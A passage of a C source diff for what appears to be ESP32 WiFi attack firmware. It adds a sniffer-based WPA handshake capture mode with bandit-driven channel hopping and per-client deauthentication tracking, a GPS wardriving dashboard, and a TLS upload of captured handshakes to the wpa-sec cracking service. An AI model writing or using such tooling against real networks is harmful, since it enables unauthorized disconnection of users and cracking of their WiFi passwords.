@@ -29,6 +29,12 @@
 #include "wifi_attacks.h"
 #include "wifi_wardrive.h"
 #include "attack_handshake.h"
+#include "frame_analyzer_types.h"
+#include "frame_analyzer_parser.h"
+#include "pcap_serializer.h"
+#include "hccapx_serializer.h"
+#include <math.h>
+#include <fcntl.h>
 #include "lvgl_memory.h"
 #include <sys/unistd.h>
 #include <sys/reent.h>
@@ -54,6 +60,9 @@
 #include "lwip/prot/ethernet.h"
 #include "esp_netif.h"
 #include "esp_netif_net_stack.h"
+
+// TLS (WPA-SEC upload)
+#include "esp_tls.h"
 
 // NimBLE (BLE scanner)
 #include "nimble/nimble_port.h"
@@ -166,6 +175,11 @@ static int bt_device_count = 0;
 #define COLOR_MATERIAL_ORANGE   lv_color_make(255, 152, 0)     // #FF9800 - orange
 #define COLOR_DARK_BLUE         lv_color_make(15, 60, 100)     // Dark blue for pressed states
 #define COLOR_LABEL_DEFAULT     lv_color_white()               // Default label text color (contrasts blue inputs)
+
+// WPA-SEC upload constants
+#define WPASEC_URL           "https://wpa-sec.stanev.org/"
+#define WPASEC_KEY_PATH      "/sdcard/lab/wpa-sec.txt"
+#define WPASEC_KEY_MAX_LEN   65
 
 typedef int (*vprintf_like_t)(const char *, va_list);
 
@@ -455,18 +469,158 @@ static QueueHandle_t handshake_log_queue = NULL;
 static bool handshake_log_capture_enabled = false;
 static volatile bool handshake_ui_active = false;
 
+// Handshake UI dashboard labels (for sniffer mode)
+static lv_obj_t *hs_ui_channel_label = NULL;
+static lv_obj_t *hs_ui_target_label = NULL;
+static lv_obj_t *hs_ui_beacon_label = NULL;
+static lv_obj_t *hs_ui_m1_label = NULL;
+static lv_obj_t *hs_ui_m2_label = NULL;
+static lv_obj_t *hs_ui_m3_label = NULL;
+static lv_obj_t *hs_ui_m4_label = NULL;
+static lv_obj_t *hs_ui_stats_label = NULL;
+static lv_obj_t *hs_ui_status_label = NULL;
+static lv_timer_t *hs_ui_timer = NULL;
+static volatile bool hs_ui_update_flag = false;
+
 // Handshake attack state
 static TaskHandle_t handshake_attack_task_handle = NULL;
 static StaticTask_t handshake_attack_task_buffer;
 static StackType_t *handshake_attack_task_stack = NULL;
 static volatile bool handshake_attack_active = false;
-static volatile bool handshake_waiting_for_scan = false;  // Flag to suppress scan results UI
-static volatile bool g_handshaker_global_mode = false;  // Suppress scan results UI for global Handshaker flow
+static volatile bool handshake_waiting_for_scan = false;
+static volatile bool g_handshaker_global_mode = false;
 static bool handshake_selected_mode = false;
 static wifi_ap_record_t handshake_targets[MAX_AP_CNT];
 static int handshake_target_count = 0;
 static bool handshake_captured[MAX_AP_CNT];
 static int handshake_current_index = 0;
+
+// ============================================================================
+// Sniffer-based Handshake Attack with D-UCB Channel Selection
+// ============================================================================
+
+#define HS_MAX_APS      64
+#define HS_MAX_CLIENTS  128
+#define DUCB_GAMMA      0.99
+#define DUCB_C          1.0
+#define HS_DEAUTH_COOLDOWN_US  (10 * 1000000LL)
+#define HS_DWELL_TIME_MS       400
+#define HS_STATS_INTERVAL_US   (30 * 1000000LL)
+
+typedef struct {
+    int channel;
+    double discounted_reward;
+    double discounted_pulls;
+    int total_pulls;
+} ducb_channel_t;
+
+typedef struct {
+    uint8_t bssid[6];
+    char ssid[33];
+    uint8_t channel;
+    wifi_auth_mode_t authmode;
+    int rssi;
+    bool captured_m1, captured_m2, captured_m3, captured_m4;
+    bool complete;
+    bool beacon_captured;
+    bool has_existing_file;
+    int64_t last_deauth_us;
+    int target_index;
+} hs_ap_target_t;
+
+typedef struct {
+    uint8_t mac[6];
+    int hs_ap_index;
+    int rssi;
+    int64_t last_seen_us;
+    int64_t last_deauth_us;
+    bool deauthed;
+} hs_client_entry_t;
+
+static const int dual_band_channels[] = {
+    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
+    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
+    132, 136, 140, 144, 149, 153, 157, 161, 165
+};
+static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);
+
+static hs_ap_target_t *hs_ap_targets = NULL;
+static int hs_ap_count = 0;
+static hs_client_entry_t *hs_clients = NULL;
+static int hs_client_count = 0;
+static ducb_channel_t *ducb_channels = NULL;
+static int ducb_channel_count = 0;
+static double ducb_discounted_total = 0.0;
+
+static volatile int hs_dwell_new_clients = 0;
+static volatile int hs_dwell_eapol_frames = 0;
+
+// Shared volatile state for UI updates
+static volatile int hs_current_channel = 0;
+static char hs_current_target_ssid[33] = "";
+static char hs_current_client_mac[20] = "";
+static volatile bool hs_listening_after_deauth = false;
+static volatile int hs_total_handshakes_captured = 0;
+
+// ============================================================================
+// Wardrive Promisc: Kismet-style tiered channel lists + D-UCB
+// ============================================================================
+
+static const uint8_t wdp_ch_24_primary[]   = {1, 6, 11};
+static const uint8_t wdp_ch_24_secondary[] = {2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
+static const uint8_t wdp_ch_5_non_dfs[]    = {36, 40, 44, 48, 149, 153, 157, 161, 165};
+static const uint8_t wdp_ch_5_dfs[]        = {52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 169, 173, 177};
+
+#define WDP_CH_24_PRIMARY_COUNT   (sizeof(wdp_ch_24_primary) / sizeof(wdp_ch_24_primary[0]))
+#define WDP_CH_24_SECONDARY_COUNT (sizeof(wdp_ch_24_secondary) / sizeof(wdp_ch_24_secondary[0]))
+#define WDP_CH_5_NON_DFS_COUNT    (sizeof(wdp_ch_5_non_dfs) / sizeof(wdp_ch_5_non_dfs[0]))
+#define WDP_CH_5_DFS_COUNT        (sizeof(wdp_ch_5_dfs) / sizeof(wdp_ch_5_dfs[0]))
+#define WDP_TOTAL_CHANNELS        (WDP_CH_24_PRIMARY_COUNT + WDP_CH_24_SECONDARY_COUNT + WDP_CH_5_NON_DFS_COUNT + WDP_CH_5_DFS_COUNT)
+
+#define WDP_DUCB_GAMMA            0.99
+#define WDP_DUCB_C                1.0
+#define WDP_DWELL_PRIMARY_MS      500
+#define WDP_DWELL_DEFAULT_MS      400
+#define WDP_DWELL_DFS_MS          250
+#define WDP_INITIAL_CAPACITY      256
+#define WDP_PSRAM_RESERVE_BYTES   (64 * 1024)
+#define WDP_STATS_INTERVAL_US     (30 * 1000000LL)
+#define WDP_FILE_FLUSH_INTERVAL   50
+
+typedef enum {
+    WDP_TIER_24_PRIMARY,
+    WDP_TIER_24_SECONDARY,
+    WDP_TIER_5_NON_DFS,
+    WDP_TIER_5_DFS,
+} wdp_channel_tier_t;
+
+typedef struct {
+    int channel;
+    wdp_channel_tier_t tier;
+    double discounted_reward;
+    double discounted_pulls;
+    int total_pulls;
+} wdp_ducb_channel_t;
+
+typedef struct {
+    uint8_t  bssid[6];
+    char     ssid[33];
+    uint8_t  channel;
+    int8_t   rssi;
+    wifi_auth_mode_t authmode;
+    bool     written_to_file;
+    float    latitude;
+    float    longitude;
+} wdp_network_t;
+
+static wdp_ducb_channel_t wdp_ducb_channels[WDP_TOTAL_CHANNELS];
+static int wdp_ducb_channel_count = 0;
+static double wdp_ducb_discounted_total = 0.0;
+static wdp_network_t *wdp_seen_networks = NULL;
+static volatile int wdp_seen_count = 0;
+static volatile int wdp_seen_capacity = 0;
+static volatile int wdp_dwell_new_networks = 0;
+static volatile bool wdp_needs_grow = false;
 
 // Wardrive UI state
 static lv_obj_t *wardrive_log_ta = NULL;
@@ -475,7 +629,16 @@ static QueueHandle_t wardrive_log_queue = NULL;
 static bool wardrive_log_capture_enabled = false;
 static volatile bool wardrive_ui_active = false;
 
-// Wardrive attack state (from original project)
+// Wardrive UI dashboard widgets
+static lv_obj_t *wd_ui_gps_label = NULL;
+static lv_obj_t *wd_ui_counter_label = NULL;
+static lv_obj_t *wd_ui_table = NULL;
+static lv_obj_t *wd_ui_channel_label = NULL;
+static lv_timer_t *wd_ui_timer = NULL;
+static volatile bool wd_ui_update_flag = false;
+static volatile int wdp_current_channel = 0;
+
+// Wardrive attack state
 static TaskHandle_t wardrive_task_handle = NULL;
 static StaticTask_t wardrive_task_buffer;
 static StackType_t *wardrive_task_stack = NULL;
@@ -529,6 +692,8 @@ static char portal_selected_html_name[64] = "";
 static int pending_attack_type = 0;
 static char wifi_connect_ssid[33] = "";
 static char wifi_connect_password[64] = "";
+static uint8_t wifi_connect_bssid[6] = {0};
+static uint8_t wifi_connect_channel = 0;
 static lv_obj_t *wifi_connect_ta = NULL;
 static lv_obj_t *wifi_connect_keyboard = NULL;
 static lv_obj_t *wifi_connect_status_label = NULL;
@@ -538,6 +703,22 @@ static volatile bool sta_connect_success = false;
 static volatile bool sta_connect_failed = false;
 static volatile int sta_connect_attempt_count = 0;
 static lv_timer_t *sta_connect_check_timer = NULL;
+
+// WPA-SEC Upload state
+static char wpasec_api_key[WPASEC_KEY_MAX_LEN] = "";
+static lv_obj_t *wpasec_status_list = NULL;
+static lv_obj_t *wpasec_progress_label = NULL;
+static lv_timer_t *wpasec_upload_timer = NULL;
+static volatile bool wpasec_upload_done = false;
+static volatile bool wpasec_upload_active = false;
+static TaskHandle_t wpasec_upload_task_handle = NULL;
+
+typedef struct {
+    char text[192];
+    lv_color_t color;
+} wpasec_ui_msg_t;
+
+static QueueHandle_t wpasec_ui_queue = NULL;
 
 // Rogue AP UI state
 static lv_obj_t *rogue_ap_content = NULL;
@@ -658,16 +839,6 @@ static volatile bool airtag_scan_update_flag = false;
 static volatile int airtag_scan_snapshot_airtag = 0;
 static volatile int airtag_scan_snapshot_smarttag = 0;
 static volatile int airtag_scan_snapshot_total = 0;
-
-// Dual-band channel list (2.4GHz + 5GHz)
-static const int dual_band_channels[] = {
-    // 2.4GHz channels
-    1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
-    // 5GHz channels
-    36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128,
-    132, 136, 140, 144, 149, 153, 157, 161, 165
-};
-static const int dual_band_channels_count = sizeof(dual_band_channels) / sizeof(dual_band_channels[0]);
 
 // Promiscuous filter
 static const wifi_promiscuous_filter_t sniffer_filter = {
@@ -803,6 +974,14 @@ static void reset_function_page_children(void) {
         lv_timer_del(sta_connect_check_timer);
         sta_connect_check_timer = NULL;
     }
+    // WPA-SEC upload cleanup
+    wpasec_status_list = NULL;
+    wpasec_progress_label = NULL;
+    wpasec_upload_active = false;  // Signal background task to stop
+    if (wpasec_upload_timer) {
+        lv_timer_del(wpasec_upload_timer);
+        wpasec_upload_timer = NULL;
+    }
 }
 
 static void create_function_page_base(const char *name);
@@ -843,9 +1022,26 @@ static void handshake_stop_btn_cb(lv_event_t *e);
 static esp_err_t handshake_enable_log_capture(void);
 static void handshake_disable_log_capture(void);
 static void handshake_attack_task(void *pvParameters);
+static void handshake_attack_task_selected(void);
+static void handshake_attack_task_sniffer(void);
 static void attack_network_with_burst(const wifi_ap_record_t *ap);
 static bool check_handshake_file_exists(const char *ssid);
+static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid);
 static void handshake_cleanup(void);
+// D-UCB and sniffer handshake helpers
+static void ducb_init(void);
+static int ducb_select_channel(void);
+static void ducb_update(int channel_idx, double reward);
+static void hs_sniffer_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
+static void hs_send_targeted_deauth(const uint8_t *station_mac, const uint8_t *ap_bssid, uint8_t channel);
+static bool hs_save_handshake_to_sd(int ap_idx);
+// Wardrive promisc helpers
+static void wdp_ducb_init(void);
+static int wdp_ducb_select_channel(void);
+static void wdp_ducb_update(int channel_idx, double reward);
+static int wdp_get_dwell_ms(wdp_channel_tier_t tier);
+static void wdp_promiscuous_cb(void *buf, wifi_promiscuous_pkt_type_t type);
+static void wardrive_promisc_task(void *pvParameters);
 static void sniffer_dog_channel_hop(void);
 static void sniffer_dog_task(void *pvParameters);
 static void sniffer_dog_promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type);
@@ -880,6 +1076,13 @@ static void show_arp_poison_page(void);
 static void show_rogue_ap_page(void);
 static void show_wpa_sec_upload_page(void);
 static void stop_arp_ban(void);
+
+// WPA-SEC upload helpers
+static bool wpasec_read_key_from_sd(void);
+static int wpasec_tls_write_all(esp_tls_t *tls, const char *buf, int len);
+static int wpasec_upload_file(const char *filepath, const char *filename);
+static void wpasec_upload_task(void *pvParameters);
+static void wpasec_upload_timer_cb(lv_timer_t *timer);
 
 // Radio mode switching (WiFi <-> BLE)
 static bool ensure_wifi_mode(void);
@@ -2605,6 +2808,16 @@ void app_main(void)
     wifi_scanner_init();
     esp_event_handler_register(WIFI_EVENT, WIFI_EVENT_SCAN_DONE, &wifi_scan_done_cb, NULL);
 
+    // Allocate sniffer handshake + wardrive promisc arrays in PSRAM
+    hs_ap_targets = (hs_ap_target_t *)heap_caps_calloc(HS_MAX_APS, sizeof(hs_ap_target_t), MALLOC_CAP_SPIRAM);
+    hs_clients = (hs_client_entry_t *)heap_caps_calloc(HS_MAX_CLIENTS, sizeof(hs_client_entry_t), MALLOC_CAP_SPIRAM);
+    ducb_channels = (ducb_channel_t *)heap_caps_calloc(dual_band_channels_count, sizeof(ducb_channel_t), MALLOC_CAP_SPIRAM);
+    wdp_seen_networks = (wdp_network_t *)heap_caps_calloc(WDP_INITIAL_CAPACITY, sizeof(wdp_network_t), MALLOC_CAP_SPIRAM);
+    wdp_seen_capacity = WDP_INITIAL_CAPACITY;
+    if (!hs_ap_targets || !hs_clients || !ducb_channels || !wdp_seen_networks) {
+        ESP_LOGE(TAG, "Failed to allocate PSRAM for sniffer/wardrive arrays!");
+    }
+
     // Initialize custom LVGL memory allocator EARLY
     ESP_LOGI(TAG, "LVGL INIT");
     lvgl_memory_init();
@@ -3905,6 +4118,156 @@ void app_main(void)
                     snprintf(stats3, sizeof(stats3), "Total BT devices: %d", snap_total);
                     lv_label_set_text(airtag_scan_stats_label3, stats3);
                     lv_obj_clear_flag(airtag_scan_stats_label3, LV_OBJ_FLAG_HIDDEN);
+                }
+            }
+
+            // Handshake dashboard UI update (flag-based, like deauth monitor)
+            if (hs_ui_update_flag && handshake_ui_active) {
+                hs_ui_update_flag = false;
+
+                if (hs_ui_channel_label && lv_obj_is_valid(hs_ui_channel_label)) {
+                    char ch_buf[32];
+                    snprintf(ch_buf, sizeof(ch_buf), "CH %d", hs_current_channel);
+                    lv_label_set_text(hs_ui_channel_label, ch_buf);
+                }
+
+                if (hs_ui_target_label && lv_obj_is_valid(hs_ui_target_label)) {
+                    if (hs_current_target_ssid[0]) {
+                        lv_label_set_text(hs_ui_target_label, hs_current_target_ssid);
+                    } else {
+                        lv_label_set_text(hs_ui_target_label, "Scanning...");
+                    }
+                }
+
+                if (hs_ui_status_label && lv_obj_is_valid(hs_ui_status_label)) {
+                    if (hs_listening_after_deauth) {
+                        char st_buf[48];
+                        snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_REFRESH " Listening... %s", hs_current_client_mac);
+                        lv_label_set_text(hs_ui_status_label, st_buf);
+                        lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_GREEN, 0);
+                    } else if (hs_current_client_mac[0]) {
+                        char st_buf[48];
+                        snprintf(st_buf, sizeof(st_buf), LV_SYMBOL_CLOSE " Deauth -> %s", hs_current_client_mac);
+                        lv_label_set_text(hs_ui_status_label, st_buf);
+                        lv_obj_set_style_text_color(hs_ui_status_label, COLOR_MATERIAL_ORANGE, 0);
+                    } else {
+                        lv_label_set_text(hs_ui_status_label, "");
+                    }
+                }
+
+                int best_ap = -1;
+                if (hs_ap_count > 0) {
+                    for (int i = 0; i < hs_ap_count; i++) {
+                        if (hs_ap_targets[i].complete && !hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
+                    }
+                    if (best_ap < 0) {
+                        for (int i = 0; i < hs_ap_count; i++) {
+                            if (hs_ap_targets[i].complete || hs_ap_targets[i].has_existing_file) continue;
+                            if (hs_ap_targets[i].channel == hs_current_channel) { best_ap = i; break; }
+                        }
+                    }
+                    if (best_ap < 0) {
+                        for (int i = 0; i < hs_ap_count; i++) {
+                            if (!hs_ap_targets[i].has_existing_file) { best_ap = i; break; }
+                        }
+                    }
+                }
+
+                bool has_beacon = false, m1 = false, m2 = false, m3 = false, m4 = false;
+                if (best_ap >= 0) {
+                    has_beacon = hs_ap_targets[best_ap].beacon_captured;
+                    m1 = hs_ap_targets[best_ap].captured_m1;
+                    m2 = hs_ap_targets[best_ap].captured_m2;
+                    m3 = hs_ap_targets[best_ap].captured_m3;
+                    m4 = hs_ap_targets[best_ap].captured_m4;
+                }
+
+                if (hs_ui_beacon_label && lv_obj_is_valid(hs_ui_beacon_label))  {
+                    lv_label_set_text(hs_ui_beacon_label, has_beacon ? LV_SYMBOL_WIFI : LV_SYMBOL_WARNING);
+                    lv_obj_set_style_text_color(hs_ui_beacon_label, has_beacon ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+                }
+                if (hs_ui_m1_label && lv_obj_is_valid(hs_ui_m1_label)) {
+                    lv_obj_set_style_text_color(hs_ui_m1_label, m1 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+                }
+                if (hs_ui_m2_label && lv_obj_is_valid(hs_ui_m2_label)) {
+                    lv_obj_set_style_text_color(hs_ui_m2_label, m2 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+                }
+                if (hs_ui_m3_label && lv_obj_is_valid(hs_ui_m3_label)) {
+                    lv_obj_set_style_text_color(hs_ui_m3_label, m3 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+                }
+                if (hs_ui_m4_label && lv_obj_is_valid(hs_ui_m4_label)) {
+                    lv_obj_set_style_text_color(hs_ui_m4_label, m4 ? COLOR_MATERIAL_GREEN : lv_color_make(80,80,80), 0);
+                }
+
+                if (hs_ui_stats_label && lv_obj_is_valid(hs_ui_stats_label)) {
+                    char stats_buf[128];
+                    snprintf(stats_buf, sizeof(stats_buf), "APs: %d   Clients: %d   Captured: %d",
+                             hs_ap_count, hs_client_count, hs_total_handshakes_captured);
+                    lv_label_set_text(hs_ui_stats_label, stats_buf);
+                }
+            }
+
+            // Wardrive dashboard UI update (flag-based)
+            if (wd_ui_update_flag && wardrive_ui_active) {
+                wd_ui_update_flag = false;
+
+                if (wd_ui_channel_label && lv_obj_is_valid(wd_ui_channel_label)) {
+                    char wd_ch_buf[16];
+                    snprintf(wd_ch_buf, sizeof(wd_ch_buf), "CH %d", wdp_current_channel);
+                    lv_label_set_text(wd_ui_channel_label, wd_ch_buf);
+                }
+
+                if (wd_ui_gps_label && lv_obj_is_valid(wd_ui_gps_label)) {
+                    char gps_buf[80];
+                    if (current_gps.valid) {
+                        snprintf(gps_buf, sizeof(gps_buf), LV_SYMBOL_GPS " %.5f, %.5f  Sats: %d",
+                                 current_gps.latitude, current_gps.longitude, current_gps.satellites);
+                        lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_GREEN, 0);
+                    } else {
+                        snprintf(gps_buf, sizeof(gps_buf), "Waiting for GPS fix...  Sats: %d", current_gps.satellites);
+                        lv_obj_set_style_text_color(wd_ui_gps_label, COLOR_MATERIAL_ORANGE, 0);
+                    }
+                    lv_label_set_text(wd_ui_gps_label, gps_buf);
+                }
+
+                if (wd_ui_counter_label && lv_obj_is_valid(wd_ui_counter_label)) {
+                    char cnt_buf[32];
+                    snprintf(cnt_buf, sizeof(cnt_buf), "%d", wdp_seen_count);
+                    lv_label_set_text(wd_ui_counter_label, cnt_buf);
+                }
+
+                if (wd_ui_table && lv_obj_is_valid(wd_ui_table)) {
+                    int total = wdp_seen_count;
+                    int show = (total > 50) ? 50 : total;
+                    int start = total - show;
+                    lv_table_set_row_cnt(wd_ui_table, show + 1);
+                    lv_table_set_col_cnt(wd_ui_table, 5);
+                    lv_table_set_cell_value(wd_ui_table, 0, 0, "SSID");
+                    lv_table_set_cell_value(wd_ui_table, 0, 1, "Ch");
+                    lv_table_set_cell_value(wd_ui_table, 0, 2, "RSSI");
+                    lv_table_set_cell_value(wd_ui_table, 0, 3, "Auth");
+                    lv_table_set_cell_value(wd_ui_table, 0, 4, "Coords");
+                    for (int i = 0; i < show; i++) {
+                        wdp_network_t *net = &wdp_seen_networks[start + show - 1 - i];
+                        char ssid_trunc[20];
+                        strncpy(ssid_trunc, net->ssid[0] ? net->ssid : "[hidden]", 19);
+                        ssid_trunc[19] = '\0';
+                        lv_table_set_cell_value(wd_ui_table, i + 1, 0, ssid_trunc);
+                        char ch_str[4]; snprintf(ch_str, sizeof(ch_str), "%d", net->channel);
+                        lv_table_set_cell_value(wd_ui_table, i + 1, 1, ch_str);
+                        char rssi_str[8]; snprintf(rssi_str, sizeof(rssi_str), "%d", net->rssi);
+                        lv_table_set_cell_value(wd_ui_table, i + 1, 2, rssi_str);
+                        const char *auth = get_auth_mode_wiggle(net->authmode);
+                        char auth_short[8]; strncpy(auth_short, auth, 7); auth_short[7] = '\0';
+                        lv_table_set_cell_value(wd_ui_table, i + 1, 3, auth_short);
+                        char coord_str[24];
+                        if (net->latitude != 0.0f || net->longitude != 0.0f) {
+                            snprintf(coord_str, sizeof(coord_str), "%.4f,%.4f", net->latitude, net->longitude);
+                        } else {
+                            snprintf(coord_str, sizeof(coord_str), "--");
+                        }
+                        lv_table_set_cell_value(wd_ui_table, i + 1, 4, coord_str);
+                    }
                 }
             }
 
@@ -5879,23 +6242,657 @@ static bool check_handshake_file_exists(const char *ssid) {
     return found;
 }
 
+static bool check_handshake_file_exists_by_bssid(const uint8_t *bssid) {
+    if (!bssid) return false;
+    char mac_suffix[7];
+    snprintf(mac_suffix, sizeof(mac_suffix), "%02X%02X%02X", bssid[3], bssid[4], bssid[5]);
+
+    if (sd_spi_mutex) xSemaphoreTake(sd_spi_mutex, portMAX_DELAY);
+    DIR *dir = opendir("/sdcard/lab/handshakes");
+    if (!dir) {
+        if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+        return false;
+    }
+    bool found = false;
+    struct dirent *entry;
+    while ((entry = readdir(dir)) != NULL) {
+        if (strstr(entry->d_name, mac_suffix) != NULL && strstr(entry->d_name, ".pcap") != NULL) {
+            found = true;
+            break;
+        }
+    }
+    closedir(dir);
+    if (sd_spi_mutex) xSemaphoreGive(sd_spi_mutex);
+    return found;
+}
+
+// ============================================================================
+// D-UCB (Discounted Upper Confidence Bound) Algorithm for Channel Selection
+// ============================================================================
+
+static void ducb_init(void) {
+    ducb_channel_count = dual_band_channels_count;
+    ducb_discounted_total = 0.0;
+    for (int i = 0; i < ducb_channel_count; i++) {
+        ducb_channels[i].channel = dual_band_channels[i];
+        ducb_channels[i].discounted_reward = 0.0;
+        ducb_channels[i].discounted_pulls = 0.0;
+        ducb_channels[i].total_pulls = 0;
+    }
+}
+
+static void ducb_apply_discount(void) {
+    ducb_discounted_total *= DUCB_GAMMA;
+    for (int i = 0; i < ducb_channel_count; i++) {
+        ducb_channels[i].discounted_reward *= DUCB_GAMMA;
+        ducb_channels[i].discounted_pulls *= DUCB_GAMMA;
+    }
+}
+
+static int ducb_select_channel(void) {
+    ducb_apply_discount();
+    int best_idx = 0;
+    double best_ucb = -1.0;
+    for (int i = 0; i < ducb_channel_count; i++) {
+        if (ducb_channels[i].discounted_pulls < 0.001) {
+            best_idx = i;
+            best_ucb = 1e18;
+            break;
+        }
+        double avg_reward = ducb_channels[i].discounted_reward / ducb_channels[i].discounted_pulls;
+        double exploration = DUCB_C * sqrt(log(ducb_discounted_total + 1.0) / ducb_channels[i].discounted_pulls);
+        double ucb = avg_reward + exploration;
+        if (ucb > best_ucb) {
+            best_ucb = ucb;
+            best_idx = i;
+        }
+    }
+    return best_idx;
+}
+
+static void ducb_update(int channel_idx, double reward) {
+    ducb_channels[channel_idx].discounted_pulls += 1.0;
+    ducb_channels[channel_idx].discounted_reward += reward;
+    ducb_channels[channel_idx].total_pulls++;
+    ducb_discounted_total += 1.0;
+}
+
+// ============================================================================
+// Wardrive Promisc: D-UCB, Dedup, Promiscuous Callback
+// ============================================================================
+
+static void wdp_ducb_init(void) {
+    wdp_ducb_channel_count = 0;
+    wdp_ducb_discounted_total = 0.0;
+    for (int i = 0; i < (int)WDP_CH_24_PRIMARY_COUNT; i++) {
+        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_24_primary[i];
+        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_24_PRIMARY;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.5;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
+        wdp_ducb_channel_count++;
+    }
+    for (int i = 0; i < (int)WDP_CH_24_SECONDARY_COUNT; i++) {
+        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_24_secondary[i];
+        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_24_SECONDARY;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
+        wdp_ducb_channel_count++;
+    }
+    for (int i = 0; i < (int)WDP_CH_5_NON_DFS_COUNT; i++) {
+        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_5_non_dfs[i];
+        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_5_NON_DFS;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
+        wdp_ducb_channel_count++;
+    }
+    for (int i = 0; i < (int)WDP_CH_5_DFS_COUNT; i++) {
+        wdp_ducb_channels[wdp_ducb_channel_count].channel = wdp_ch_5_dfs[i];
+        wdp_ducb_channels[wdp_ducb_channel_count].tier = WDP_TIER_5_DFS;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_reward = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].discounted_pulls = 0.0;
+        wdp_ducb_channels[wdp_ducb_channel_count].total_pulls = 0;
+        wdp_ducb_channel_count++;
+    }
+}
+
+static int wdp_ducb_select_channel(void) {
+    wdp_ducb_discounted_total *= WDP_DUCB_GAMMA;
+    for (int i = 0; i < wdp_ducb_channel_count; i++) {
+        wdp_ducb_channels[i].discounted_reward *= WDP_DUCB_GAMMA;
+        wdp_ducb_channels[i].discounted_pulls *= WDP_DUCB_GAMMA;
+    }
+    int best_idx = 0;
+    double best_ucb = -1.0;
+    for (int i = 0; i < wdp_ducb_channel_count; i++) {
+        if (wdp_ducb_channels[i].discounted_pulls < 0.001) {
+            best_idx = i;
+            break;
+        }
+        double avg_reward = wdp_ducb_channels[i].discounted_reward / wdp_ducb_channels[i].discounted_pulls;
+        double exploration = WDP_DUCB_C * sqrt(log(wdp_ducb_discounted_total + 1.0) / wdp_ducb_channels[i].discounted_pulls);
+        double ucb = avg_reward + exploration;
+        if (ucb > best_ucb) {
+            best_ucb = ucb;
+            best_idx = i;
+        }
+    }
+    return best_idx;
+}
+
+static void wdp_ducb_update(int channel_idx, double reward) {
+    wdp_ducb_channels[channel_idx].discounted_pulls += 1.0;
+    wdp_ducb_channels[channel_idx].discounted_reward += reward;
+    wdp_ducb_channels[channel_idx].total_pulls++;
+    wdp_ducb_discounted_total += 1.0;
+}
+
+static int wdp_get_dwell_ms(wdp_channel_tier_t tier) {
+    switch (tier) {
+        case WDP_TIER_24_PRIMARY:   return WDP_DWELL_PRIMARY_MS;
+        case WDP_TIER_24_SECONDARY: return WDP_DWELL_DEFAULT_MS;
+        case WDP_TIER_5_NON_DFS:    return WDP_DWELL_DEFAULT_MS;
+        case WDP_TIER_5_DFS:        return WDP_DWELL_DFS_MS;
+        default:                    return WDP_DWELL_DEFAULT_MS;
+    }
+}
+
+// ============================================================================
+// Sniffer Handshake: AP and Client Management
+// ============================================================================
+
+static int hs_find_ap(const uint8_t *bssid) {
+    for (int i = 0; i < hs_ap_count; i++) {
+        if (memcmp(hs_ap_targets[i].bssid, bssid, 6) == 0) return i;
+    }
+    return -1;
+}
+
+static int hs_add_or_update_ap(const uint8_t *bssid, const char *ssid, uint8_t channel,
+                                wifi_auth_mode_t authmode, int rssi) {
+    int idx = hs_find_ap(bssid);
+    if (idx >= 0) {
+        if (ssid && ssid[0]) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
+        hs_ap_targets[idx].channel = channel;
+        hs_ap_targets[idx].rssi = rssi;
+        if (authmode != WIFI_AUTH_OPEN) hs_ap_targets[idx].authmode = authmode;
+        return idx;
+    }
+    if (hs_ap_count >= HS_MAX_APS) return -1;
+    idx = hs_ap_count++;
+    memcpy(hs_ap_targets[idx].bssid, bssid, 6);
+    if (ssid) strncpy(hs_ap_targets[idx].ssid, ssid, 32);
+    hs_ap_targets[idx].ssid[32] = '\0';
+    hs_ap_targets[idx].channel = channel;
+    hs_ap_targets[idx].authmode = authmode;
+    hs_ap_targets[idx].rssi = rssi;
+    hs_ap_targets[idx].captured_m1 = false;
+    hs_ap_targets[idx].captured_m2 = false;
+    hs_ap_targets[idx].captured_m3 = false;
+    hs_ap_targets[idx].captured_m4 = false;
+    hs_ap_targets[idx].complete = false;
+    hs_ap_targets[idx].beacon_captured = false;
+    hs_ap_targets[idx].last_deauth_us = 0;
+    hs_ap_targets[idx].target_index = -1;
+    hs_ap_targets[idx].has_existing_file =
+        check_handshake_file_exists(ssid ? ssid : "") ||
